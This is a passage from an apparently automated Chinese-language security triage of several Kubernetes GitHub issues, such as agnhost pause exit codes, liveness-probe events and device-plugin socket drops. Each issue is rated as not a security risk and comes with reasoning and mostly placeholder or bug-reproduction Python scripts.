    watch_thread = threading.Thread(target=watch_nodes, daemon=True)
    watch_thread.start()
    logging.info("Watch thread started in the background.")

    # 主线程等待一段时间，模拟 watch 连接的持续时间
    # 在实际场景中，这个 watch 连接会一直存在，直到 kubectl 进程被杀掉
    # 或者 apiserver 关闭连接（在优雅关闭期间理论上不应立即关闭）
    # 这里我们让它运行 150 秒（略长于2分钟超时限制），然后尝试停止
    wait_time = 150
    logging.info(f"Main thread will wait for {wait_time} seconds before stopping the watch.")
    time.sleep(wait_time)

    # (模拟外部操作) 尝试停止 watch
    logging.info("Simulating the end of the watch client or external interruption.")
    stop_watch.set()

    # 等待 watch 线程结束
    watch_thread.join(timeout=10) # 给 watch 线程一点时间来响应停止信号
    if watch_thread.is_alive():
        logging.warning("Watch thread did not stop gracefully after signal.")

    logging.info("Main function finished.")

# 直接调用 main 函数，而不是使用 if __name__ == "__main__":
main()
"""

print("该Issue被评定为'不涉及'安全风险，因此不提供功能性复现POC。")
```


**解释说明：**

该Issue描述的`kube-apiserver`关闭缓慢问题，是由于其依赖的Go `http.Server`在执行`Shutdown`时会等待现有连接（包括长轮询的Watch请求和其他组件的连接）完成或超时。这属于服务可用性和运维效率范畴的问题，尤其在需要频繁重启或快速更新`kube-apiserver`时会造成困扰。然而，它并不直接引入安全漏洞，如信息泄露、权限提升或远程代码执行等。攻击者即使能通过发起Watch请求延长关闭时间，其影响也仅限于延迟关闭过程，属于低影响的拒绝服务（影响关闭），且需要合法权限。根据提供的风险判断标准，该问题不构成安全风险，因此风险评级为“不涉及”，且无需提供用于安全验证的POC脚本。提供的注释代码仅为演示如何用Python发起一个Watch连接，以模拟可能导致此现象的用户行为之一，并非用于复现安全漏洞。

---


## Issue #131035 Make CSIDriver.attachRequired field mutable

- Issue 链接：[#131035](https://github.com/kubernetes/kubernetes/issues/131035)

### Issue 内容

#### What happened?

We added support in k8s to handle mutable attachRequired
https://github.com/kubernetes/kubernetes/pull/93710

However we did not actually make the API field mutable:
https://github.com/kubernetes/kubernetes/blob/62555cadc741a8aef31acab05e9ed60f897edb1b/pkg/apis/storage/types.go#L286

#### What did you expect to happen?

Support CSIDriver.attachRequired mutable 

#### How can we reproduce it (as minimally and precisely as possible)?

Please see above

#### Anything else we need to know?

The estimation of work is about a month

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue提出需要将Kubernetes API对象`CSIDriver`中的`attachRequired`字段设置为可变的（mutable）。目前，虽然Kubernetes内部逻辑（如PR #93710）已经支持处理该字段的变化，但API定义本身（`pkg/apis/storage/types.go#L286`）并未将该字段标记为可变，导致创建`CSIDriver`对象后无法修改`attachRequired`的值。

这是一个功能增强或API设计修正的请求，旨在使API行为与控制器逻辑保持一致。该Issue描述的问题是API字段的不可变性，而不是一个可以被利用来执行未授权操作、泄露信息、导致拒绝服务或提升权限的安全漏洞。修改`CSIDriver`对象通常需要较高的权限（如`cluster-admin`），并且修改`attachRequired`字段本身是为了调整存储卷的挂载行为，不直接引入安全风险。

根据提供的风险判断标准：
1.  该问题并非安全问题，不涉及利用漏洞进行攻击。
2.  修改`CSIDriver`需要相应权限，即使字段可变，也是授权用户的预期操作。
3.  不涉及命令执行、容器逃逸、提权等高风险场景。
4.  不涉及日志泄露凭据。
5.  不涉及低权限用户影响其他用户。

因此，该Issue不构成安全风险。

**复现过程：**

```python
# 该Issue描述的是API字段定义与期望功能不符的问题，并非一个可利用的安全漏洞。
# 它请求将CSIDriver对象的attachRequired字段从不可变（immutable）改为可变（mutable）。
# 无法通过编写POC来“复现”一个安全漏洞，因为这里不存在安全漏洞。
# 验证该Issue的方法是尝试更新一个已存在的CSIDriver对象的attachRequired字段，
# 预期会收到API Server拒绝更新的错误（因为字段当前是不可变的）。
# 待Kubernetes未来版本修复此Issue后，同样的更新操作应该会成功。
# 因此，不提供复现安全漏洞的POC脚本。

def verify_issue():
    print("该Issue描述了一个API功能限制，而非安全漏洞。")
    print("验证方法是尝试使用Kubernetes API客户端（如kubectl或Python库）更新现有CSIDriver对象的 'attachRequired' 字段。")
    print("在当前版本（根据Issue描述），此操作预期会失败，报告字段不可变。")
    print("无需提供针对安全漏洞的复现脚本。")

# 直接执行验证说明
verify_issue()
```


**解释说明：**

该Python脚本并未尝试复现一个安全漏洞，因为它分析的Issue并不涉及安全风险。脚本的`verify_issue`函数打印了说明信息，解释了该Issue的性质——它是一个关于API字段可变性的功能请求/修正。脚本指出，验证此Issue状态的方法是尝试通过Kubernetes API修改现有`CSIDriver`资源的`attachRequired`字段。在问题未修复的版本中，此操作预期会失败并提示字段不可变。由于不存在可利用的安全漏洞，因此不生成用于攻击或利用的POC脚本，仅提供解释性说明。该脚本符合“不涉及”风险评级的结论，并遵循了不为非高风险问题生成POC的要求。

---


## Issue #131026 Liveness probes failure does not log event

- Issue 链接：[#131026](https://github.com/kubernetes/kubernetes/issues/131026)

### Issue 内容

#### What happened?

It has been observed that liveness probe is not logging event every time in all scenario. We have executed below steps:


1. Created nginx pod with below readiness and liveness probes parameter values. Keep touch /var/opt/podinstalled and /var/opt/liveness file.

```
readinessProbe:
  exec:
    command: ["ls", "/var/opt/podinstalled" ]
  initialDelaySeconds: 60
  timeoutSeconds: 3
  periodSeconds: 5
  failureThreshold: 3
  successThreshold: 1
livenessProbe:
  exec:
    command: ["ls", "/var/opt/liveness" ]
  initialDelaySeconds: 120
  timeoutSeconds: 20
  periodSeconds: 30
  failureThreshold: 4
  successThreshold: 1
```



2. Verify pod describe logs after deleting liveness file. 

```
root@web-0:/# rm -rf /var/opt/liveness
root@web-0:/#
```

Liveness probe failed and container restarted 

```
  Normal   Pulled          13m               kubelet            Container image "nginx:1.14.2" already present on machine
  Normal   Created         13m               kubelet            Created container web
  Normal   Started         13m               kubelet            Started container web
  Warning  Unhealthy       1s (x4 over 91s)  kubelet            Liveness probe failed: ls: cannot access '/var/opt/liveness': No such file or directory
  Normal   Killing         1s                kubelet            Container web failed liveness probe, will be restarted
```


3. After touching both files and waited for few mins after container restart


```
$ kubectl get pods | grep -i web
web-0                                                             1/1     Running                 1 (8m39s ago)    21m
$
```

There is no further readiness and liveness probe failure observed

  ```
Warning  Unhealthy       9m1s (x4 over 10m)     kubelet            Liveness probe failed: ls: cannot access '/var/opt/liveness': No such file or directory
  Normal   Killing         9m1s                   kubelet            Container web failed liveness probe, will be restarted
  Normal   Pulled          8m58s (x2 over 22m)    kubelet            Container image "nginx:1.14.2" already present on machine
  Normal   Created         8m58s (x2 over 22m)    kubelet            Created container web
  Normal   Started         8m57s (x2 over 22m)    kubelet            Started container web
  Warning  Unhealthy       7m1s (x13 over 7m56s)  kubelet            Readiness probe failed: ls: cannot access '/var/opt/podinstalled': No such file or directory
```

4. Now delete liveness file again

`root@web-0:/# rm -rf /var/opt/liveness`

Container will be restarted again.

```
  Normal   Pulled          12m (x2 over 25m)   kubelet            Container image "nginx:1.14.2" already present on machine
  Normal   Created         12m (x2 over 25m)   kubelet            Created container web
  Normal   Started         12m (x2 over 25m)   kubelet            Started container web
  Warning  Unhealthy       10m (x13 over 10m)  kubelet            Readiness probe failed: ls: cannot access '/var/opt/podinstalled': No such file or directory
  Warning  Unhealthy       64s (x8 over 13m)   kubelet            Liveness probe failed: ls: cannot access '/var/opt/liveness': No such file or directory
  Normal   Killing         64s (x2 over 12m)   kubelet            Container web failed liveness probe, will be restarted
```


5. Now wait for few seconds after container to be up again and this time do not touch any file related to readiness and liveness probes.
Now real problem beigns.


```
$ kubectl get pods | grep -i web
web-0                                                             0/1     Running                 2 (97s ago)      25m
$
```

Readiness probe event generated

```
  Normal   Pulled          15m (x2 over 28m)     kubelet            Container image "nginx:1.14.2" already present on machine
  Normal   Created         15m (x2 over 28m)     kubelet            Created container web
  Normal   Started         15m (x2 over 28m)     kubelet            Started container web
  Warning  Unhealthy       4m18s (x8 over 16m)   kubelet            Liveness probe failed: ls: cannot access '/var/opt/liveness': No such file or directory
  Normal   Killing         4m18s (x2 over 15m)   kubelet            Container web failed liveness probe, will be restarted
  Warning  Unhealthy       3m13s (x14 over 14m)  kubelet            Readiness probe failed: ls: cannot access '/var/opt/podinstalled': No such file or directory
```

However no new event related to liveness failure generated and container restarted without any information this time.

```
$ kubectl get pods -w| grep -i web
web-0                                                             0/1     Running                 2 (2m36s ago)    26m

web-0                                                             0/1     Running                 3 (1s ago)       28m

```

6. Now this time touch readiness file and do not touch liveness file. Event for liveness generated this time.

```
  Normal   Pulled          22m (x2 over 35m)     kubelet            Container image "nginx:1.14.2" already present on machine
  Normal   Created         22m (x2 over 35m)     kubelet            Created container web
  Normal   Started         22m (x2 over 35m)     kubelet            Started container web
  Normal   Killing         11m (x2 over 22m)     kubelet            Container web failed liveness probe, will be restarted
  Warning  Unhealthy       5m33s (x66 over 21m)  kubelet            Readiness probe failed: ls: cannot access '/var/opt/podinstalled': No such file or directory
  Warning  Unhealthy       8s (x19 over 24m)     kubelet            Liveness probe failed: ls: cannot access '/var/opt/liveness': No such file or directory
```
  

Container also restarted.
```
$ kubectl get pods -w| grep -i web
web-0                                                             1/1     Running                 4 (115s ago)       33m

web-0                                                             0/1     Running                 5 (1s ago)         36m

```


**Query:** Is there any event logging problem related to liveness if readiness is already failed? Is it some known behavior or some kind of bug in event logging?






#### What did you expect to happen?

**Expected Behavior** - Liveness probe should log event every time so that container restart reason can be identified.

#### How can we reproduce it (as minimally and precisely as possible)?

**Repoduction:** Every time with same steps as shared in problem section.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# $ kubectl version
WARNING: This version information is deprecated and will be replaced with the output from kubectl version --short.  Use --output=yaml|json to get the full version.
Client Version: version.Info{Major:"1", Minor:"27", GitVersion:"v1.27.4", GitCommit:"fa3d7990104d7c1f16943a67f11b154b71f6a132", GitTreeState:"clean", BuildDate:"2023-07-19T12:20:54Z", GoVersion:"go1.20.6", Compiler:"gc", Platform:"linux/amd64"}
Kustomize Version: v5.0.1
Server Version: version.Info{Major:"1", Minor:"31", GitVersion:"v1.31.1", GitCommit:"725a577fede9eea95e282ea4f3bb40aea1f37ee5", GitTreeState:"clean", BuildDate:"2024-10-15T09:48:51Z", GoVersion:"go1.22.6", Compiler:"gc", Platform:"linux/amd64"}
WARNING: version difference between client (1.27) and server (1.31) exceeds the supported minor version skew of +/-1
$

```

</details>


#### Cloud provider

<details>
Local kubernetes cluster
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
#  cat /etc/os-release
NAME="SLES"
VERSION="15-SP5"
VERSION_ID="15.5"
PRETTY_NAME="SUSE Linux Enterprise Server 15 SP5"
ID="sles"
ID_LIKE="suse"
ANSI_COLOR="0;32"
CPE_NAME="cpe:/o:suse:sles:15:sp5"
DOCUMENTATION_URL="https://documentation.suse.com/"
$ uname -a
# Linux test-master-3 5.14.21-150500.55.83-default #1 SMP PREEMPT_DYNAMIC Wed Oct 2 08:09:07 UTC 2024 (0d53847) x86_64 x86_64 x86_64 GNU/Linux

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>
NA
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
containerd-1.7.21-150000.117.1.x86_64
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
calico
</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue报告了一个在特定条件下Kubernetes Liveness Probe失败时事件（Event）未能记录的问题。具体场景是：当Pod的Readiness Probe已经处于失败状态时，后续Liveness Probe的失败可能不会生成相应的"Unhealthy"事件，即使容器因此被重启了。

1.  **问题性质**：该问题核心在于Kubernetes事件记录系统（特别是Kubelet生成的事件）在特定并发探测失败场景下的行为不一致。用户期望每次Liveness Probe失败导致容器重启时，都应有明确的事件记录，以便追踪和诊断问题。
2.  **安全影响评估**：
    *   **机密性（Confidentiality）**：该问题不涉及数据泄露。
    *   **完整性（Integrity）**：该问题不涉及数据或系统配置的未授权修改。
    *   **可用性（Availability）**：虽然Liveness Probe失败会导致容器重启，这是预期的恢复机制。事件记录的缺失本身并不直接导致额外的服务中断，但它会妨碍管理员快速准确地诊断容器重启的原因，可能间接延长故障排查时间。然而，这并非传统意义上的、由攻击者利用漏洞触发的DoS。容器仍然根据探测结果进行重启。
    *   **利用条件**：这个问题描述的是系统行为，而不是一个可被外部攻击者直接利用来发起攻击的漏洞。它影响的是系统的可观测性（Observability）。
    *   **权限要求**：触发此问题的条件（探测失败）通常由应用程序内部状态或环境问题引起，而非需要特定权限的攻击操作。
    *   **敏感信息暴露**：Issue提交者在描述中没有暴露敏感信息。
    *   **命令执行/提权等**：该问题与命令执行、提权、容器逃逸等高风险行为无关。
    *   **多用户场景影响**：此问题影响的是特定Pod的事件记录，主要影响该Pod的管理员或运维人员的诊断工作，不会直接影响其他租户或用户的Pod。

3.  **结论**：根据上述分析，该Issue描述的是一个影响系统可观测性的功能性问题或Bug，它使得在特定条件下追踪容器重启原因变得困难。然而，它本身并不构成一个可以直接被利用来危害系统安全（如获取权限、窃取数据、发起DoS攻击）的漏洞。根据提供的风险判断标准第2条，此问题非安全问题。

**复现过程：**

```python
# 此处不提供复现脚本。
# 原因：根据风险评级结果，该Issue被判定为“不涉及”安全风险。
# 按照要求，仅针对“高风险”问题提供Python复现脚本。
# 该Issue描述的是一个可观测性方面的问题（事件记录缺失），而非安全漏洞。
# Issue描述中已经包含了使用kubectl和shell命令手动复现该问题的详细步骤。
```


**解释说明：**

该Issue报告的问题是关于Kubernetes在特定条件下（Readiness Probe已失败时）未能持续记录Liveness Probe失败事件，这影响了问题的可诊断性。经过分析，此问题属于系统行为或潜在Bug，影响的是运维的可观测性，并不直接引入安全风险，如未授权访问、数据泄露、拒绝服务攻击或权限提升等。因此，其风险评级为“不涉及”。

由于该问题不属于安全风险，特别是高风险类别，根据要求，无需提供Python POC（Proof of Concept）脚本。Issue报告中已提供了清晰的手动复现步骤，涉及创建特定配置的Pod，并在容器内手动删除文件以模拟探测失败，然后观察`kubectl describe pod`输出的事件记录。

---


## Issue #131021 Test tooling: agnhost pause command may exit with 0 occasionally

- Issue 链接：[#131021](https://github.com/kubernetes/kubernetes/issues/131021)

### Issue 内容

#### What happened?

The agnhost command may occasionally exit with 0 which is not the intention: https://github.com/kubernetes/kubernetes/blob/78e9ba9d9ac70ceeadd90e95af553add0e2ed36e/test/images/agnhost/pause/pause.go#L37-L56

#### What did you expect to happen?

Only exit with failure, 1 (sigint), 2 sigterm, if the traps are registered.

#### How can we reproduce it (as minimally and precisely as possible)?

1. Compile the agnost image with the following changes to make it more likely to happen:
```
func pause(cmd *cobra.Command, args []string) {
        fmt.Println("Paused")
        sigCh := make(chan os.Signal, 1)
        done := make(chan int, 1)
        signal.Notify(sigCh, syscall.SIGINT)
        signal.Notify(sigCh, syscall.SIGTERM)
        fmt.Println("Signals registered")
        go func() {
                sig := <-sigCh
                switch sig {
                case syscall.SIGINT:
                        fmt.Println("received SIGINT")
                        done <- 1
                        time.Sleep(time.Minute)
                        os.Exit(1)
                case syscall.SIGTERM:
                        fmt.Println("received SIGTERM")
                        done <- 2
                        time.Sleep(time.Minute)
                        os.Exit(2)
                }
        }()
        result := <-done
        fmt.Printf("exiting %d\n", result)
}
```
Such an image is here: https://hub.docker.com/repository/docker/mszadkow256/moje/tags/2.53-sleep-pause/sha2[…]de7b47e396a90e6ed9eaf66b0e3a66d6378211327fd18cbfd9deb090db06a

2. Run it `docker run --rm mszadkow256/moje:2.53-sleep-pause pause`
3. In another console send SIGTERM: `docker exec 60a273597124 kill 1` 
Issue: The pause command exists with 0 (check with `echo $?`



#### Anything else we need to know?

This caused flakes in Kueue tests which was assuming the exit code is always a failure: https://github.com/kubernetes-sigs/kueue/issues/4733

I think the intention of the code is 

```golang
func pause(cmd *cobra.Command, args []string) {
        fmt.Println("Paused")
        sigCh := make(chan os.Signal, 1)
        done := make(chan int, 1)
        signal.Notify(sigCh, syscall.SIGINT)
        signal.Notify(sigCh, syscall.SIGTERM)
        fmt.Println("Signals registered")
        go func() {
                sig := <-sigCh
                switch sig {
                case syscall.SIGINT:
                        done <- 1
                case syscall.SIGTERM:
                        done <- 2
                }
        }()
        result := <-done
        fmt.Printf("exiting %d\n", result)
        os.Exit(result)
}
```

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
1.  **Issue 本质分析**: 该 Issue 指出 Kubernetes 测试工具 `agnhost` 中的 `pause` 命令在接收到 SIGINT 或 SIGTERM 信号时，存在偶然以退出码 0 退出的情况。根据 Issue 描述和提供的 Go 代码片段，根本原因是 Go 协程（goroutine）在处理信号后，虽然通过 channel (`done`) 将预期的退出码（1 或 2）发送给了主线程，但主线程在接收到该值、打印后就正常结束了，导致进程的最终退出码为隐式的 0。而在协程内部调用的 `os.Exit(result)`（在原始代码或修改后的代码中，尤其是在`time.Sleep`之后）发生在主线程退出之后或几乎同时，无法影响主进程最终的退出状态码。Issue 提交者提供的复现步骤通过在信号处理协程中加入 `time.Sleep` 强制延迟 `os.Exit` 的调用，使得主线程几乎总是在 `os.Exit` 调用前退出，从而稳定复现退出码为 0 的情况。
2.  **影响分析**: `agnhost` 是一个用于 Kubernetes 端到端（e2e）测试的镜像，提供了多种辅助功能。`pause` 命令通常用于保持 Pod 运行（类似基础镜像的 `pause`）或测试信号处理。此 Issue 描述的 bug 导致 `pause` 命令的退出码行为不符合预期。直接影响是在依赖此退出码进行判断的测试场景中（如 Issue 中提到的 Kueue 测试）会导致测试用例变得不稳定（flaky）。
3.  **安全风险评估**:
    *   **漏洞类型**: 这本质上是一个功能性 Bug，是程序逻辑错误导致的行为不符合预期，而非典型的安全漏洞（如 RCE, SQLi, XSS, 权限提升等）。
    *   **利用条件**: 要触发这个 bug 并观察到错误的退出码，需要能够向运行 `agnhost pause` 的容器内的进程发送信号（如 SIGTERM）。在 Kubernetes 环境中，这通常需要具有 `exec` 到 Pod 或直接操作 Docker/containerd 守护进程的权限。攻击者如果已经拥有这些权限，他们通常已经可以执行更高权限的操作（如直接在容器内执行命令、停止容器等）。
    *   **潜在影响**: 错误的退出码本身并不会直接导致信息泄露、权限提升、远程代码执行或拒绝服务（进程确实退出了，只是状态码不对）。它可能影响依赖此退出码的自动化流程或测试的正确性。在生产环境中使用 `agnhost` 本身就不常见且不推荐，其主要设计目的是测试。即使在测试环境中，其影响也局限于测试结果的准确性/稳定性。
    *   **依据规则判断**:
        *   规则 2: 该问题非安全问题，是功能性 bug。
        *   规则 5: 即使视为某种形式的“行为异常”，触发它也需要执行操作（发送信号）的权限，不属于无权限或低权限攻击。
        *   规则 7 & 8: 不涉及命令执行、提权、容器逃逸或影响其他租户。
    *   **结论**: 该 Issue 描述的问题是一个功能性 Bug，不构成安全风险。

**复现过程：**

```python
# 该脚本旨在复现 Issue 中描述的 agnhost pause 命令在接收 SIGTERM 后
# 以退出码 0 退出的 Bug，而非安全漏洞利用。
# 脚本依赖 docker SDK for Python (pip install docker)
# 并且需要本地 Docker 环境正在运行且有权限操作。

import docker
import time
import sys

# 使用 Issue 中提供的特定镜像，该镜像已修改以更容易复现问题
IMAGE_NAME = "mszadkow256/moje:2.53-sleep-pause"
# Docker Hub 上的 SHA 指向: 
# sha256:369de7b47e396a90e6ed9eaf66b0e3a66d6378211327fd18cbfd9deb090db06a
# 如果需要，可以使用完整的 digest: mszadkow256/moje@sha256:369de7b47e396a90e6ed9eaf66b0e3a66d6378211327fd18cbfd9deb090db06a

def main():
    """
    主函数，执行复现步骤。
    """
    container = None
    client = None
    try:
        client = docker.from_env()
        print(f"[*] 正在尝试拉取镜像: {IMAGE_NAME}")
        try:
            client.images.pull(IMAGE_NAME)
            print(f"[+] 镜像拉取成功: {IMAGE_NAME}")
        except docker.errors.ImageNotFound:
            print(f"[!] 错误: 镜像 {IMAGE_NAME} 未找到。请确保镜像名称和标签正确。")
            sys.exit(1)
        except docker.errors.APIError as e:
            print(f"[!] 拉取镜像时发生 Docker API 错误: {e}")
            sys.exit(1)

        print("[*] 正在以后台模式启动容器...")
        # 使用 detach=True 在后台运行， auto_remove=False 以便后续获取退出码
        container = client.containers.run(
            IMAGE_NAME,
            command="pause",
            detach=True,
            auto_remove=False # 设置为 False 以便检查退出状态
        )
        print(f"[+] 容器已启动，ID: {container.id[:12]}")

        # 等待容器内 pause 进程启动并注册信号处理器
        print("[*] 等待 3 秒让容器内进程稳定...")
        time.sleep(3)

        # 向容器内的 PID 1 发送 SIGTERM 信号 (agnhost pause 通常是 PID 1)
        print("[*] 正在向容器内的 PID 1 发送 SIGTERM 信号...")
        # 注意：这里的 'kill 1' 是在容器内部执行的命令
        exec_result = container.exec_run("kill -TERM 1")
        if exec_result.exit_code != 0:
            print(f"[!] 在容器内执行 kill 命令失败，退出码: {exec_result.exit_code}")
            print(f"    输出: {exec_result.output.decode('utf-8', errors='ignore')}")
            # 即使 kill 失败，也继续尝试获取容器退出状态
        else:
            print("[+] SIGTERM 信号已发送。")

        # 等待容器退出，设置超时时间
        print("[*] 等待容器退出 (最多等待 60 秒)...")
        try:
            # wait() 返回一个包含 'StatusCode' 的字典
            result = container.wait(timeout=60)
            exit_code = result.get('StatusCode', None)
            print(f"[+] 容器已退出。")
            if exit_code == 0:
                print(f"[✓] 复现成功: 容器退出码为 {exit_code}，符合 Issue 描述的 Bug 行为。")
                print("    预期行为（根据修复建议）：对于 SIGTERM，退出码应为 2。")
            elif exit_code is not None:
                print(f"[?] 容器退出码为 {exit_code}，与 Issue 中描述的主要现象 (退出码 0) 不符，但这仍可能是竞态条件的不同结果。")
            else:
                 print(f"[!] 未能获取到明确的退出码: {result}")

        except Exception as e:
            # 超时或其他等待错误
            print(f"[!] 等待容器退出时发生错误: {e}")
            print("[*] 尝试强制停止容器...")
            try:
                container.stop(timeout=5)
            except Exception as stop_err:
                print(f"[!] 强制停止容器时出错: {stop_err}")

    except docker.errors.NotFound:
        print(f"[!] 错误: 容器 {container.id[:12] if container else '未知'} 似乎在操作过程中意外消失了。")
    except docker.errors.APIError as e:
        print(f"[!] Docker API 错误: {e}")
        print("    请确保 Docker 守护进程正在运行且当前用户有权限访问。")
    except Exception as e:
        print(f"[!] 发生意外错误: {e}")
    finally:
        if container:
            print("[*] 清理容器...")
            try:
                # 确保容器停止并移除
                container.reload() # 获取最新状态
                if container.status not in ["removing", "exited", "dead"]:
                    container.stop(timeout=10)
                container.remove(force=True) # 使用 force=True 确保移除
                print(f"[+] 容器 {container.id[:12]} 已清理。")
            except docker.errors.NotFound:
                 print(f"[*] 容器 {container.id[:12]} 已经被移除。")
            except Exception as cleanup_err:
                print(f"[!] 清理容器 {container.id[:12]} 时出错: {cleanup_err}")

# 直接执行 main 函数 (根据要求，不使用 if __name__ == "__main__":)
main()
```


**解释说明：**

该 Python 脚本使用 `docker` Python 库来自动化复现 Issue 中描述的 `agnhost pause` 命令的 Bug。

1.  **环境准备**: 脚本首先初始化 Docker 客户端，并尝试拉取 Issue 中指定的、包含修改后代码以更容易触发 Bug 的 Docker 镜像 (`mszadkow256/moje:2.53-sleep-pause`)。
2.  **运行容器**: 脚本在后台启动一个基于该镜像的容器，并执行 `pause` 命令。`auto_remove=False` 确保容器退出后不会立即被删除，以便我们能检查其退出码。
3.  **触发条件**: 脚本等待短暂时间（3 秒）以确保容器内的 `pause` 进程已启动并设置好信号处理。然后，它使用 `container.exec_run("kill -TERM 1")` 命令在运行的容器内部向进程 ID 为 1（通常是 `agnhost pause` 进程）发送 SIGTERM 信号。
4.  **结果验证**: 脚本接着调用 `container.wait()` 等待容器进程自然退出，并获取其最终的退出状态码。
5.  **输出判断**: 脚本打印获取到的退出码。如果退出码为 0，则表示成功复现了 Issue 中描述的 Bug（即收到 SIGTERM 后错误地以 0 退出）。脚本同时会指出预期的正确行为（根据 Issue 修复建议，收到 SIGTERM 应以退出码 2 退出）。
6.  **清理**: 无论成功与否，脚本最后都会尝试停止并移除创建的容器，以清理环境。
7.  **错误处理与超时**: 脚本包含了对 Docker API 错误、镜像未找到、容器操作错误等的异常处理，并为容器等待操作设置了超时时间（60 秒），防止脚本无限期挂起。

**重要提示**: 此脚本仅用于演示和验证 Issue 中描述的 `agnhost` 工具的功能性 Bug，确认其退出码行为与预期不符。它本身并不利用任何安全漏洞。执行此脚本需要本地安装并运行 Docker，并且执行用户需要有相应的 Docker 操作权限。

---


## Issue #131013 The Unix domain socket EOF between kubelet and device plugin is disconnected. Currently, kubelet does not have the retry mechanism

- Issue 链接：[#131013](https://github.com/kubernetes/kubernetes/issues/131013)

### Issue 内容

#### What happened?

The Unix domain socket EOF between kubelet and device plugin is disconnected. Currently, kubelet does not have the retry mechanism.

#### What did you expect to happen?

kubelet can retry to connect device plugin when kubelet and device plugin is disconnected

#### How can we reproduce it (as minimally and precisely as possible)?

1. create pod using multi gpu
2. in container, run the task
3. after a long time, the link is broken

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该 Issue 描述了 Kubernetes 的 `kubelet` 组件与其管理的设备插件（Device Plugin）之间的 Unix 域套接字（Unix Domain Socket, UDS）连接在某些情况下（例如长时间运行后）会断开（EOF），并且 `kubelet` 当前没有自动重试连接的机制。

1.  **问题性质**：这本质上是一个**可靠性（Reliability）**和**可用性（Availability）**问题。当 `kubelet` 与设备插件的 UDS 连接断开后，`kubelet` 无法再通过该插件获取和分配特定的硬件资源（如 Issue 中提到的 GPU）。这会导致需要这些特定资源的新 Pod 无法被调度到该节点，或者正在运行的 Pod 如果需要重新与设备插件交互（虽然不常见，但取决于插件实现），可能会遇到问题。
2.  **潜在影响**：主要影响是节点上的特定设备资源（如 GPU）变得不可用，依赖这些资源的 Pod 无法在该节点上启动或运行。这是一种**拒绝服务（Denial of Service, DoS）**，但影响范围局限于单个节点上的特定类型设备。
3.  **安全风险评估**：
    *   **触发条件**：Issue 中描述的触发条件是“长时间运行后”，这表明这更可能是一个稳定性问题或资源耗尽/管理不当导致连接中断，而不是由外部攻击者主动发起的攻击。没有信息表明攻击者可以轻易地、远程地或以低权限用户的身份触发这个 UDS 连接断开。通常，要影响节点上的 UDS，需要较高的权限（如 root 权限或对相关进程/文件的访问权限）。
    *   **漏洞类型**：核心问题是缺乏重试机制，这是一个功能缺陷，导致系统在遇到连接问题时不够健壮。它本身不涉及信息泄露、权限提升、命令执行等典型的安全漏洞。
    *   **DoS 风险评估 (依据规则 5)**：虽然这是一个 DoS，但它影响的是节点上的设备可用性。根据 Issue 描述，没有明确证据表明低权限用户可以触发此问题来影响其他用户或整个集群。即使攻击者有某种方法（未在 Issue 中描述）能够触发此连接断开，如果这需要较高的权限（例如节点访问权限），根据规则 5，其风险等级也应降低。鉴于目前信息，我们倾向于认为这是一个功能和可靠性问题，而非可被轻易利用的安全漏洞。
    *   **其他高风险场景 (规则 7, 8)**：该问题不涉及命令执行、容器逃逸、提权等高风险场景。它也不太可能被低权限用户用来影响其他用户（除非该用户有特定权限能干扰节点上的 `kubelet` 或设备插件进程）。

4.  **结论**：基于现有信息，该 Issue 描述的是一个功能健壮性和可用性方面的问题，虽然会导致特定资源的 DoS，但没有明确迹象表明它是一个可被常规用户或远程攻击者利用的安全漏洞。其触发条件不清晰且似乎与系统内部状态有关，而非外部恶意输入。因此，根据提供的风险判断标准，特别是考虑到 DoS 的触发条件和影响范围，以及缺乏明确的安全利用场景，此问题不应被归类为安全风险。

**复现过程：**

```python
# Risk assessment is "Not Involved", no POC script required.
# The issue describes a lack of reliability (no retry mechanism for UDS connection)
# rather than a security vulnerability that can be actively exploited by an attacker
# according to the provided information. Reproducing this would involve setting up
# a device plugin, running workloads for a long time, and observing the connection
# drop, which is hard to reliably trigger on demand and doesn't demonstrate
# a security exploit.
```


**解释说明：**

由于分析结论为该 Issue **不涉及**安全风险，而主要是一个关于系统可靠性和可用性的功能缺陷（缺少连接重试机制），因此根据要求，无需提供用于复现安全漏洞的 POC 脚本。该问题的复现更侧重于模拟长时间运行或特定系统条件以观察连接断开，而非模拟攻击行为。

---


## Issue #130999 ConfigMap SubPath Volume Mount failed on `util-linux=2.41`

- Issue 链接：[#130999](https://github.com/kubernetes/kubernetes/issues/130999)

### Issue 内容

#### What happened?

Mount command executes failed when creating a Pod using ConfigMap SubPath volume after upgrading `util-linux` to `2.41`.

`kubectl describe pod` Events: 

```log
